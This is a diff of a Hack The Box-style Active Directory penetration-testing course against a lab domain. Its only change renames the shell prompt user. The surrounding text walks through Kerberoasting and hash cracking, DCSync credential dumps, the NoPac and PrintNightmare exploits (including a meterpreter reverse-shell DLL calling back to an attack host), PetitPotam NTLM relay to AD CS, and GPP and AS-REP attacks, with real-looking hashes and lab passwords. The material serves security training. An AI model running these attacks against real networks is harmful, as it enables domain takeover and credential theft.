+root@htb[/htb]$ echo "<base64 blob>" |  tr -d \\n 
 
 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
 ```
@@ -5493,7 +5493,7 @@ We can place the above single line of output into a file and convert it back to 
 &#x20; Kerberoasting - from Windows
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ cat encoded_file | base64 -d > sqldev.kirbi
+root@htb[/htb]$ cat encoded_file | base64 -d > sqldev.kirbi
 ```
 
 Next, we can use [this](https://raw.githubusercontent.com/nidem/kerberoast/907bf234745fe907cf85f3fd916d1c14ab9d65c0/kirbi2john.py) version of the `kirbi2john.py` tool to extract the Kerberos ticket from the TGS file.
@@ -5503,7 +5503,7 @@ Next, we can use [this](https://raw.githubusercontent.com/nidem/kerberoast/907bf
 &#x20; Kerberoasting - from Windows
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ python2.7 kirbi2john.py sqldev.kirbi
+root@htb[/htb]$ python2.7 kirbi2john.py sqldev.kirbi
 ```
 
 This will create a file called `crack_file`. We then must modify the file a bit to be able to use Hashcat against the hash.
@@ -5513,7 +5513,7 @@ This will create a file called `crack_file`. We then must modify the file a bit 
 &#x20; Kerberoasting - from Windows
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
+root@htb[/htb]$ sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
 ```
 
 Now we can check and confirm that we have a hash that can be fed to Hashcat.
@@ -5523,7 +5523,7 @@ Now we can check and confirm that we have a hash that can be fed to Hashcat.
 &#x20; Kerberoasting - from Windows
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ cat sqldev_tgs_hashcat 
+root@htb[/htb]$ cat sqldev_tgs_hashcat 
 
 $krb5tgs$23$*sqldev.kirbi*$813149fb261549a6a1b4965ed49d1ba8$7a8c91b47c534bc258d5c97acf433841b2ef2478b425865dc75c39b1dce7f50dedcc29fc8a97aef8d51a22c5720ee614fcb646e28d854bcdc2c8b362bbfaf62dcd9933c55efeba9d77e4c6c6f524afee5c68dacfcb6607291a20cdfb0ef144055356a7296e33b440754be7f87754ac2e4858348e2aebb7270b2d345047f880e17acc07e27a8f752c372bc83a62d54208d12288893d32afd210191dd3b2c56797bd1a72e35a73a7820be51fbf277b83d8181fff5a05cf21481a7b462ceb01c3761c50952689ed1099827c17c2934131db71bc5142c589cd70ed2ebf57dca3f6226f3b21849529355414433210b8d7bd76fec4eb68a45deebc3e7cc931ed8769328536769123f5040d6771915cdbc6c90164669fac72d23a631fef25804b5c8ec39680a4cc2959929edce34bbee6aff135bcbbb26a41a4b4e88b936896d4662ac849f56d7d68071be139cf4dfaf66497015297f9b44cdaef096c8d00255ec3e62f7105d905d0b2f39cef83db4d812718f95e8c99129f3207b386b4c32f7d57befd411e19c218148d19028eb0103d6be99ae23a454f6f3b0339d00d27879f342598937596cadad068ac3d815952a053f87d87b2584784b9d83050eea9a7c6474cde26c90f4a3546076a40ed374d004c465f654623499ca14e9c11538012cf00dee315e2ed444293822502d7f685022e61f3568e1db25b5cfe5a89b33878b6e3db05e9d91ad63820fcb7d0449e66add13f1efceddda95339db3dc919f1caff9690e54b3e4f9a8cf6998a9f9bf55c7a2ed2c87382e9da60f7ca3c22e08cc359f3ef6f4603a5af2fc28303bf3602ab9bc52026e58c27fb247fd4210f45244fd71484685b837fe9573a53964d54acfde7f963028764e99bea7b77139cb651328e862e43d894638288eace99b6d4f8b6684150db9adc43254143b77f32ebe6fbe309dde3b78305fdf0fe60505f9000b89c67c75ef6dd425e04fbe3a5ebf2d78a11a392d815a29ef48d9457fb6c780eb4cc07dfa68c2e97054788952f5ad92ca8d062e4a68967860302fd9630174af832e599bb5fca9cf341d7a1176868d9073796dffbd48efe99b222f4274e93066de646b3c60d1dd94072dd121dd0706024d11738a75ebeb5b7865a5505220d0f03aea6d359a17f3c5b6424989b31b6e52d1c558393aa34e81204fb107374a8884dcb16f6c59a76a0022004fd921734b8719e8694ba0d7f87eb46f5607af4eb1c681b6b5140dbc94a9ea7f5db6ae4c71fbc1024a25b77ac00bdc549d66373d390643be8f1007930a4124e99d4fcb6177dbd5669fb06170d3b8a75db9928164b55e454d08e77f917b1dd2e648d9c7eb0cb2b8ca0eff8a44d1ea5fdd67e01da79047a4a1406f761f5e3b6944cebed45379ea14e7a027c843fa405c07c8385a2102f07967a7cb4883f44ee72d4aa7a38b2701e77374016a01193f5b178e34f4cf2d8eadf651e162569eb421c74e8d5e0cc1a9fab58a4b9b63babb09efc3427e1667f9c7731bcabe3645986040a7306924df5e6e68655e7b0e2e88e7ce0281e0f554de82d9de6c4d9c8d2a36fce65bbb337a415030ce1d03c00fd9783afb5df0ee8fbabfa358521ad845e6d07fde7d34f2311ebae6e6a119d60d899467a66f997c273d2df73350f2d6c5438e71a057feeab
 ```
@@ -5535,7 +5535,7 @@ We can then run the ticket through Hashcat again and get the cleartext password 
 &#x20; Kerberoasting - from Windows
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt 
+root@htb[/htb]$ hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt 
 
 <SNIP>
 
@@ -5858,7 +5858,7 @@ Next, let's crack this ticket using Hashcat and note how long it took. The accou
 &#x20; Kerberoasting - from Windows
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt 
+root@htb[/htb]$ hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt 
 
 hashcat (v6.1.1) starting...
 
@@ -5937,7 +5937,7 @@ To run this through Hashcat, we need to use hash mode `19700`, which is `Kerbero
 &#x20; Kerberoasting - from Windows
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt 
+root@htb[/htb]$ hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt 
 
 hashcat (v6.1.1) starting...
 
@@ -6916,7 +6916,7 @@ Running the tool as below will write all hashes to files with the prefix `inlane
 &#x20; DCSync
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 
+root@htb[/htb]$ secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 
 
 Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation
 
@@ -6967,7 +6967,7 @@ If we check the files created using the `-just-dc` flag, we will see that there 
 &#x20; DCSync
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ls inlanefreight_hashes*
+root@htb[/htb]$ ls inlanefreight_hashes*
 
 inlanefreight_hashes.ntds  inlanefreight_hashes.ntds.cleartext  inlanefreight_hashes.ntds.kerberos
 ```
@@ -7021,7 +7021,7 @@ We will notice the tool decrypted the password and provided us with the cleartex
 &#x20; DCSync
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ cat inlanefreight_hashes.ntds.cleartext 
+root@htb[/htb]$ cat inlanefreight_hashes.ntds.cleartext 
 
 proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!
 ```
@@ -7240,7 +7240,7 @@ To use `evil-winrm` we can install it using the following command:
 &#x20; Privileged Access
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ gem install evil-winrm
+root@htb[/htb]$ gem install evil-winrm
 ```
 
 Typing `evil-winrm` will give us the help menu and all of the available commands.
@@ -7250,7 +7250,7 @@ Typing `evil-winrm` will give us the help menu and all of the available commands
 &#x20; Privileged Access
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ evil-winrm 
+root@htb[/htb]$ evil-winrm 
 
 Evil-WinRM shell v3.3
 
@@ -7284,7 +7284,7 @@ We can connect with just an IP address and valid credentials.
 &#x20; Privileged Access
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ evil-winrm -i 10.129.201.234 -u forend
+root@htb[/htb]$ evil-winrm -i 10.129.201.234 -u forend
 
 Enter Password: 
 
@@ -7366,7 +7366,7 @@ We can also authenticate from our Linux attack host using [mssqlclient.py](https
 &#x20; Privileged Access
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ mssqlclient.py 
+root@htb[/htb]$ mssqlclient.py 
 
 Impacket v0.9.24.dev1+20210922.102044.c7bc76f8 - Copyright 2021 SecureAuth Corporation
 
@@ -7387,7 +7387,7 @@ positional arguments:
 &#x20; Privileged Access
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
+root@htb[/htb]$ mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
 Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation
 
 Password:
@@ -8099,13 +8099,13 @@ NoPac uses many tools in Impacket to communicate with, upload a payload, and iss
 &#x20; Bleeding Edge Vulnerabilities
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ git clone https://github.com/SecureAuthCorp/impacket.git
+root@htb[/htb]$ git clone https://github.com/SecureAuthCorp/impacket.git
 ```
 
 &#x20; Bleeding Edge Vulnerabilities
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ python setup.py install 
+root@htb[/htb]$ python setup.py install 
 ```
 
 **Cloning the NoPac Exploit Repo**
@@ -8113,7 +8113,7 @@ AbdulrahmanTamim@htb[/htb]$ python setup.py install
 &#x20; Bleeding Edge Vulnerabilities
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ git clone https://github.com/Ridter/noPac.git
+root@htb[/htb]$ git clone https://github.com/Ridter/noPac.git
 ```
 
 Once Impacket is installed and we ensure the repo is cloned to our attack box, we can use the scripts in the NoPac directory to check if the system is vulnerable using a scanner (`scanner.py`) then use the exploit (`noPac.py`) to gain a shell as `NT AUTHORITY/SYSTEM`. We can use the scanner with a standard domain user account to attempt to obtain a TGT from the target Domain Controller. If successful, this indicates the system is, in fact, vulnerable. We'll also notice the `ms-DS-MachineAccountQuota` number is set to 10. In some environments, an astute sysadmin may set the `ms-DS-MachineAccountQuota` value to 0. If this is the case, the attack will fail because our user will not have the rights to add a new machine account. Setting this to `0` can prevent quite a few AD attacks.
@@ -8123,7 +8123,7 @@ Once Impacket is installed and we ensure the repo is cloned to our attack box, w
 &#x20; Bleeding Edge Vulnerabilities
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
+root@htb[/htb]$ sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
 
 ███    ██  ██████  ██████   █████   ██████ 
 ████   ██ ██    ██ ██   ██ ██   ██ ██      
@@ -8143,7 +8143,7 @@ There are many different ways to use NoPac to further our access. One way is to 
 &#x20; Bleeding Edge Vulnerabilities
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
+root@htb[/htb]$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
 
 ███    ██  ██████  ██████   █████   ██████ 
 ████   ██ ██    ██ ██   ██ ██   ██ ██      
@@ -8185,7 +8185,7 @@ It is important to note that NoPac.py does save the TGT in the directory on the 
 &#x20; Bleeding Edge Vulnerabilities
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ls
+root@htb[/htb]$ ls
 
 administrator_DC01.INLANEFREIGHT.local.ccache  noPac.py   requirements.txt  utils
 README.md  scanner.py
@@ -8198,7 +8198,7 @@ We could then use the ccache file to perform a pass-the-ticket and perform furth
 &#x20; Bleeding Edge Vulnerabilities
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
+root@htb[/htb]$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
 
 ███    ██  ██████  ██████   █████   ██████ 
 ████   ██ ██    ██ ██   ██ ██   ██ ██      
@@ -8247,7 +8247,7 @@ Before conducting this attack, we must retrieve the exploit we will use. In this
 &#x20; Bleeding Edge Vulnerabilities
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ git clone https://github.com/cube0x0/CVE-2021-1675.git
+root@htb[/htb]$ git clone https://github.com/cube0x0/CVE-2021-1675.git
 ```
 
 For this exploit to work successfully, we will need to use cube0x0's version of Impacket. We may need to uninstall the version of Impacket on our attack host and install cube0x0's (this is already installed on ATTACK01 in the lab). We can use the commands below to accomplish this:
@@ -8270,7 +8270,7 @@ We can use `rpcdump.py` to see if `Print System Asynchronous Protocol` and `Prin
 &#x20; Bleeding Edge Vulnerabilities
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
+root@htb[/htb]$ rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
 
 Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
 Protocol: [MS-RPRN]: Print System Remote Protocol 
@@ -8283,7 +8283,7 @@ After confirming this, we can proceed with attempting to use the exploit. We can
 &#x20; Bleeding Edge Vulnerabilities
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
+root@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
 
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x64 from the payload
@@ -8299,7 +8299,7 @@ We will then host this payload in an SMB share we create on our attack host usin
 &#x20; Bleeding Edge Vulnerabilities
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
+root@htb[/htb]$ sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
 
 Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation
 
@@ -8338,7 +8338,7 @@ With the share hosting our payload and our multi handler listening for a connect
 &#x20; Bleeding Edge Vulnerabilities
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'
+root@htb[/htb]$ sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'
 
 [*] Connecting to ncacn_np:172.16.5.5[\PIPE\spoolss]
 [+] Bind OK
@@ -8391,7 +8391,7 @@ Let's walk through the attack. First off, we need to start `ntlmrelayx.py` in on
 &#x20; Bleeding Edge Vulnerabilities
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
+root@htb[/htb]$ sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
 
 Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - 
 
@@ -8438,7 +8438,7 @@ Here we run the tool and attempt to coerce authentication via the [EfsRpcOpenFil
 &#x20; Bleeding Edge Vulnerabilities
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ python3 PetitPotam.py 172.16.5.225 172.16.5.5       
+root@htb[/htb]$ python3 PetitPotam.py 172.16.5.225 172.16.5.5       
                                                                                  
               ___            _        _      _        ___            _                     
              | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   
@@ -8470,7 +8470,7 @@ Back in our other window, we will see a successful login request and obtain the 
 &#x20; Bleeding Edge Vulnerabilities
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
+root@htb[/htb]$ sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
 
 Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
 
@@ -8526,7 +8526,7 @@ Next, we can take this base64 certificate and use `gettgtpkinit.py` to request a
 &#x20; Bleeding Edge Vulnerabilities
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache
+root@htb[/htb]$ python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache
 
 2022-04-05 15:56:33,239 minikerberos INFO     Loading certificate and key from file
 INFO:minikerberos:Loading certificate and key from file
@@ -8547,7 +8547,7 @@ The TGT requested above was saved down to the `dc01.ccache` file, which we use t
 &#x20; Bleeding Edge Vulnerabilities
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ export KRB5CCNAME=dc01.ccache
+root@htb[/htb]$ export KRB5CCNAME=dc01.ccache
 ```
 
 **Using Domain Controller TGT to DCSync**
@@ -8557,7 +8557,7 @@ We can then use this TGT with `secretsdump.py` to perform a DCSYnc and retrieve 
 &#x20; Bleeding Edge Vulnerabilities
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+root@htb[/htb]$ secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
 
 Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
 
@@ -8578,7 +8578,7 @@ We could also use a more straightforward command: `secretsdump.py -just-dc-user 
 &#x20; Bleeding Edge Vulnerabilities
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ klist
+root@htb[/htb]$ klist
 
 Ticket cache: FILE:dc01.ccache
 Default principal: ACADEMY-EA-DC01$@INLANEFREIGHT.LOCAL
@@ -8594,7 +8594,7 @@ Finally, we could use the NT hash for the built-in Administrator account to auth
 &#x20; Bleeding Edge Vulnerabilities
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf
+root@htb[/htb]$ crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf
 
 SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
 SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
@@ -8607,7 +8607,7 @@ We can also take an alternate route once we have the TGT for our target. Using t
 &#x20; Bleeding Edge Vulnerabilities
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$
+root@htb[/htb]$ python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$
 
 Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
 
@@ -8624,7 +8624,7 @@ We can then use this hash to perform a DCSync with secretsdump.py using the `-ha
 &#x20; Bleeding Edge Vulnerabilities
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba
+root@htb[/htb]$ secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba
 
 Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
 
@@ -8913,7 +8913,7 @@ On the first run of the tool, we can see that some records are blank, namely `?,
 &#x20; Miscellaneous Misconfigurations
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 
+root@htb[/htb]$ adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 
 
 Password: 
 
@@ -8929,7 +8929,7 @@ Password:
 &#x20; Miscellaneous Misconfigurations
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ head records.csv 
+root@htb[/htb]$ head records.csv 
 
 type,name,value
 ?,LOGISTICS,?
@@ -8950,7 +8950,7 @@ If we run again with the `-r` flag the tool will attempt to resolve unknown reco
 &#x20; Miscellaneous Misconfigurations
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r
+root@htb[/htb]$ adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r
 
 Password: 
 
@@ -8966,7 +8966,7 @@ Password:
 &#x20; Miscellaneous Misconfigurations
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ head records.csv 
+root@htb[/htb]$ head records.csv 
 
 type,name,value
 A,LOGISTICS,172.16.5.240
@@ -9110,7 +9110,7 @@ If you retrieve the cpassword value more manually, the `gpp-decrypt` utility can
 &#x20; Miscellaneous Misconfigurations
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
+root@htb[/htb]$ gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
 
 Password1
 ```
@@ -9122,7 +9122,7 @@ GPP passwords can be located by searching or manually browsing the SYSVOL share 
 &#x20; Miscellaneous Misconfigurations
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ crackmapexec smb -L | grep gpp
+root@htb[/htb]$ crackmapexec smb -L | grep gpp
 
 [*] gpp_autologin             Searches the domain controller for registry.xml to find autologon information and returns the username and password.
 [*] gpp_password              Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.
@@ -9135,7 +9135,7 @@ It is also possible to find passwords in files such as Registry.xml when autolog
 &#x20; Miscellaneous Misconfigurations
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
+root@htb[/htb]$ crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
 
 SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
 SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 
@@ -9222,7 +9222,7 @@ We can then crack the hash offline using Hashcat with mode `18200`.
 &#x20; Miscellaneous Misconfigurations
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt 
+root@htb[/htb]$ hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt 
 
 hashcat (v6.1.1) starting...
 
@@ -9257,7 +9257,7 @@ When performing user enumeration with `Kerbrute`, the tool will automatically re
 &#x20; Miscellaneous Misconfigurations
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
+root@htb[/htb]$ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
 
     __             __               __     
    / /_____  _____/ /_  _______  __/ /____ 
@@ -9292,7 +9292,7 @@ With a list of valid users, we can use [Get-NPUsers.py](https://github.com/Secur
 &#x20; Miscellaneous Misconfigurations
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users 
